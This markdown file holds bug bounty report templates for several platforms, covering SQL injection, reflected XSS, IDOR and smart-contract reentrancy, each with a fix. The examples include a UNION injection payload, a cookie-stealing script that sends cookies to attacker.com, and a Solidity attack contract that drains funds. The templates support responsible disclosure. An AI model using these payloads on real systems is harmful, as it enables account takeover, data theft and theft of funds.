# 📝 Bug Bounty Report Templates

## HackerOne — Critical/High Template

```markdown
**Title:** [Vulnerability Type] in [Component] allows [Impact]

**Severity:** Critical

**Summary:**
[2-3 sentences describing the bug, location, and impact]

A SQL injection vulnerability exists in the `/api/customers` endpoint's
`id` parameter, allowing unauthenticated attackers to read, modify, or
delete all records from the customer database, exposing personally
identifiable information (PII) of millions of users.

---

**Vulnerability Details:**

The `id` parameter in `GET /api/customers?id=X` is directly interpolated
into a SQL query without sanitization or parameterization:

```sql
SELECT * FROM customers WHERE id = [USER INPUT]
```

This allows an attacker to inject arbitrary SQL, including UNION-based
data extraction and time-based blind techniques.

---

**Steps to Reproduce:**

1. Send the following HTTP request:
```
GET /api/customers?id=1' UNION SELECT email,password,NULL FROM users-- HTTP/1.1
Host: target.com
```

2. Observe the response contains email addresses and password hashes:
```json
{
  "data": [
    {"email": "victim@example.com", "col2": "$2b$10$hashedpassword..."}
  ]
}
```

3. [Attach screenshot showing the data dump]

---

**Proof of Concept:**

```bash
# PoC curl command (safe — reads only first row)
curl -s "https://target.com/api/customers?id=1' AND '1'='1" | python3 -m json.tool
```

[VIDEO: 2-minute screen recording showing the full exploit]
[SCREENSHOT 1: Burp Suite request]
[SCREENSHOT 2: Response with customer data]

---

**Impact:**

- **Direct**: Attacker can read all `N` customer records including emails,
  addresses, phone numbers, and hashed passwords
- **Account Takeover**: With hashed passwords, attacker can perform offline
  cracking → account takeover at scale
- **Regulatory**: GDPR Article 33 requires breach notification within 72h.
  Potential fines up to 4% of global annual revenue
- **Business**: Competitor or malicious actor could steal entire customer base

---

**CVSS Score:**

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**Score: 9.8 (Critical)**

---

**Remediation:**

Replace string interpolation with parameterized queries:

❌ **Vulnerable:**
```python
query = f"SELECT * FROM customers WHERE id = {request.args.get('id')}"
db.execute(query)
```

✅ **Fixed:**
```python
query = "SELECT * FROM customers WHERE id = %s"
db.execute(query, (request.args.get('id'),))
```

Additional recommendations:
- Validate and whitelist ID format (numeric only)
- Apply principle of least privilege on database user
- Consider WAF rule for SQLi patterns as defense-in-depth

---

**Timeline:**
- **Discovered:** [Date]
- **Reported:** [Date]
- **Resolved:** [Date — fill after fix]
```

---

## HackerOne — XSS Template

```markdown
**Title:** Reflected XSS in search endpoint allows cookie theft and account takeover

**Severity:** High

**Summary:**
The `/search` endpoint reflects user input unsanitized into the HTML response,
allowing an attacker to execute arbitrary JavaScript in victims' browsers,
leading to session cookie theft and account takeover.

**Steps to Reproduce:**
1. Open browser, navigate to:
   `https://target.com/search?q=<script>alert(document.cookie)</script>`
2. Observe the JavaScript executes, displaying session cookies

**Real-world attack scenario:**
1. Attacker crafts malicious URL:
   `https://target.com/search?q=<script>fetch('https://attacker.com?c='+document.cookie)</script>`
2. Attacker sends link to victim via phishing email
3. Victim clicks link → cookies sent to attacker's server
4. Attacker uses stolen session cookie to access victim's account

**Impact:**
- Session hijacking → full account takeover
- Can be used for targeted phishing using trusted domain
- If admin clicks → admin panel compromise

**Remediation:**
- HTML-encode all user input before reflection
- Implement strict Content Security Policy (CSP)
- Set HttpOnly flag on session cookies
```

---

## HackerOne — IDOR Template

```markdown
**Title:** IDOR in /api/orders/{id} allows any authenticated user to view other users' order details

**Severity:** High

**Summary:**
The order detail API endpoint `/api/orders/{id}` lacks authorization checks,
allowing any authenticated user to access order information belonging to other users
by simply changing the order ID in the URL.

**Steps to Reproduce:**
1. Log in as User A (attacker). Create an order. Note the order ID (e.g., `12345`)
2. Log in as User B (victim) in a separate browser/incognito. Create an order.
   Note the order ID (e.g., `12346`)
3. While logged in as User A, send:
   `GET /api/orders/12346`
4. Observe: User A receives User B's complete order details including:
   - Shipping address
   - Items purchased  
   - Payment method (last 4 digits)
   - Order total

**Proof of Concept:**
[Burp Suite screenshot showing attacker accessing victim's order]
[Response showing victim's personal data]

**Impact:**
- Privacy violation: exposure of users' shipping addresses, purchase history
- Could be escalated to find all order IDs sequentially
- Potential regulatory violations (PCI DSS, GDPR)

**Remediation:**
Add server-side ownership check before returning data:
```python
# ❌ Vulnerable
order = Order.find(params[:id])
render json: order

# ✅ Fixed  
order = current_user.orders.find(params[:id])  # scoped to user
render json: order
```
```

---

## Bugcrowd Template

```markdown
**Bug Title:** [Vuln Type] in [Location] — [One-line impact]

**Vulnerability Type (VRT):**
INJECTION > Cross-Site Scripting (XSS) > Reflected

**Severity:** P2 — High

**Priority:** P2

**Target:** https://target.com

**Description:**
[Full technical description]

**Environment:**
- Browser: Chrome 120
- OS: Linux
- Account type: Unauthenticated / Free user / Premium user

**Reproduction Steps:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Expected Result:**
User input should be sanitized before reflection.

**Actual Result:**
JavaScript payload executes in the browser context.

**Impact:**
[Specific, measurable impact]

**Proof of Concept:**
[Screenshots, videos, HTTP requests]

**Suggested Fix:**
[Specific remediation with code example]
```

---

## Intigriti Template

```markdown
**Vulnerability title:** [Type] — [Location] — [Impact]

**Severity:** Critical / High / Medium / Low

**Description:**
[Technical description]

**Steps to reproduce:**
1. [Step]
2. [Step]

**Evidence:**
- [Screenshot]
- [Video]
- [HTTP Request/Response]

**Impact:**
[Business impact]

**CVSS Score:**
[CVSS:3.1/AV:.../...]

**Proof of Concept:**
[PoC code/command]

**Remediation:**
[Specific fix]
```

---

## Immunefi (Web3/Smart Contracts) Template

```markdown
**Vulnerability title:** Reentrancy in withdraw() allows draining contract funds

**Protocol:** [Protocol Name]

**Contract Address:** 0x...

**Severity:** Critical

**Vulnerability Class:** Reentrancy

**Description:**
The `withdraw()` function sends ETH before updating the user balance,
allowing a malicious contract to re-enter and withdraw repeatedly before
the balance is updated to zero.

**Vulnerable Code:**
```solidity
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount);
    (bool success,) = msg.sender.call{value: amount}("");  // ← sends ETH first
    balances[msg.sender] -= amount;  // ← updates balance AFTER
}
```

**Attack Contract:**
```solidity
contract Attack {
    Victim victim;
    function attack() external payable {
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }
    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);  // re-enter!
        }
    }
}
```

**Proof of Concept:**
[Foundry/Hardhat test demonstrating the exploit]

**Impact:**
Complete drainage of contract ETH balance.
Current TVL at risk: $X,XXX,XXX

**Remediation:**
Use Checks-Effects-Interactions pattern:
```solidity
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;  // ← update state FIRST
    (bool success,) = msg.sender.call{value: amount}("");  // ← then send
    require(success);
}
```
Or use OpenZeppelin's `ReentrancyGuard`.
```
